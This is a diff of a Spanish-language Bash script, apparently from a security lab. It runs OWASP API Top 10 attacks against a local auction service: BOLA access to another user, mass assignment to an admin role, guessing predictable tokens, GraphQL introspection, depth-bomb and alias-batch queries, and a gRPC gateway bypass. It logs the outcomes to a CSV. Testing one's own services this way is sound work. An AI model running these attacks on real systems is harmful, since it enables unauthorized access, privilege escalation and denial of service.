@@ -1,53 +1,70 @@
 #!/bin/bash
-set -e
+
 ETIQUETA=${1:-manual}
 
-# Endpoints reales mapeados en docker-compose
-REST_BASE="http://localhost:8080"
-GQL_URL="http://localhost:4000/graphql"
-GRPC_HOST="127.0.0.1" 
+# Usamos 127.0.0.1 en lugar de localhost para evitar conflictos de resolución IPv6 con certificados autofirmados
+if [ "$ETIQUETA" = "blindado" ]; then
+    REST_BASE="https://127.0.0.1:8080"
+    CURL_OPTS=(-k -sS --connect-timeout 5 --max-time 10)
+else
+    REST_BASE="http://127.0.0.1:8080"
+    CURL_OPTS=(-sS --connect-timeout 5 --max-time 10)
+fi
+
+GQL_URL="http://127.0.0.1:4000/graphql"
+GRPC_HOST="127.0.0.1"
 GRPC_PUERTO=50051
+
+if [ ! -f results.csv ]; then
+    echo "timestamp,ataque,objetivo,http_status,resultado,detalle" > results.csv
+fi
 
 echo "== Rol 4: corrida [$ETIQUETA] =========================================="
 
-# 1) Registrar usuario de prueba y obtener token
-echo "-- Registrando usuario y obteniendo token --"
-curl -s -X POST "$REST_BASE/api/v1/registro" \
-  -H "Content-Type: application/json" \
-  -d '{"nombre":"atacante","correo":"atac@test.com","password":"x"}' > /dev/null || true
+echo "-- Registrando usuario víctima y obteniendo token atacante --"
 
-LOGIN=$(curl -s -X POST "$REST_BASE/api/v1/login" \
+curl "${CURL_OPTS[@]}" -X POST "$REST_BASE/api/v1/registro" \
   -H "Content-Type: application/json" \
-  -d '{"correo":"atac@test.com","password":"x"}')
+  -d '{"nombre":"victima","correo":"victima@test.com","password":"x"}' \
+  > /dev/null || true
 
-TOKEN=$(echo "$LOGIN" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
-if [ -z "$TOKEN" ]; then
-    echo "Error: No se pudo obtener el token."
-    exit 1
+curl "${CURL_OPTS[@]}" -X POST "$REST_BASE/api/v1/registro" \
+  -H "Content-Type: application/json" \
+  -d '{"nombre":"atacante","correo":"atac@test.com","password":"x"}' \
+  > /dev/null || true
+
+LOGIN=$(curl "${CURL_OPTS[@]}" -X POST "$REST_BASE/api/v1/login" \
+  -H "Content-Type: application/json" \
+  -d '{"correo":"atac@test.com","password":"x"}' || true)
+
+RAW_TOKEN=$(echo "$LOGIN" | grep -o '"token":"[^"]*"' | cut -d'"' -f4 || true)
+
+if [ -z "$RAW_TOKEN" ]; then
+    echo "WARNING: No se pudo obtener token. Respuesta: $LOGIN"
+    TOKEN="Bearer TOKEN_INVALIDO"
+else
+    TOKEN="Bearer $RAW_TOKEN"
+    echo "Token obtenido: $TOKEN"
 fi
-TOKEN="Bearer $TOKEN"
-echo "Token obtenido: $TOKEN"
 
-echo "-- API1 BOLA (intentar acceder a usuario usr-1) --"
-# Truco: al no usar {id}, el script concatena la plantilla con el número, 
-# resultando en /api/v1/usuarios/usr-1, que es el ID real que genera el servicio.
+echo "-- API1 BOLA --"
 ./rest_bola "$REST_BASE" "/api/v1/usuarios/usr-" "$TOKEN" 1 1 || true
 
-echo "-- API3 Mass assignment (intentar escalar rol a admin en usr-1) --"
+echo "-- API3 Mass assignment --"
 ./rest_mass_assignment "$REST_BASE/api/v1/usuarios/usr-1" "$TOKEN" \
     nombre="hacker" rol="admin" || true
 
 echo "-- API2 Auth debil (sin token) --"
 ./rest_auth_debil sin-token "$REST_BASE/api/v1/perfil" || true
 
-echo "-- API2 Auth debil (adivinar token predecible) --"
+echo "-- API2 Auth debil (adivinar) --"
 ./rest_auth_debil adivinar "$REST_BASE/api/v1/perfil" "tok-usr-1-" 1 20 || true
 
 echo "-- API8 Introspeccion GraphQL --"
-./graphql_introspection "$GQL_URL" "$TOKEN" || true
+./graphql_introspection "$GQL_URL" "$RAW_TOKEN" || true
 
 echo "-- API4 Bomba de profundidad GraphQL --"
-./graphql_depth_bomb "$GQL_URL" subasta vendedor.subastas 300 || true
+./graphql_depth_bomb "$GQL_URL" subasta vendedor.subastas 15 || true
 
 echo "-- API6 Alias batch en login GraphQL --"
 yes "x" | head -n 100 > /tmp/dic.txt
@@ -56,7 +73,7 @@ yes "x" | head -n 100 > /tmp/dic.txt
 echo "-- API9 gRPC reflection --"
 ./grpc_reflection "$GRPC_HOST" "$GRPC_PUERTO" || true
 
-echo "-- API5 gRPC bypass del gateway (Pujar directo, sin token) --"
+echo "-- API5 gRPC bypass del gateway --"
 ./grpc_bypass_gateway "$GRPC_HOST" "$GRPC_PUERTO" subasta-demo usuario-atacante 100000 || true
 
 echo "== listo, ver results.csv ==============================================="
